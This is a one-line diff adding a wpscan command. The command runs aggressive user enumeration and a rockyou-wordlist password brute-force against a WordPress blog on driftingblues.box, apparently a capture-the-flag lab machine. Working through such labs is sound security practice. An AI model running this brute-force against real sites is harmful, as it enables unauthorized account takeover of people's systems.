@@ -1,0 +1,1 @@
+wpscan --url http://driftingblues.box/blog --detection-mode aggressive -e --passwords=/home/kali/rockyou.txt 
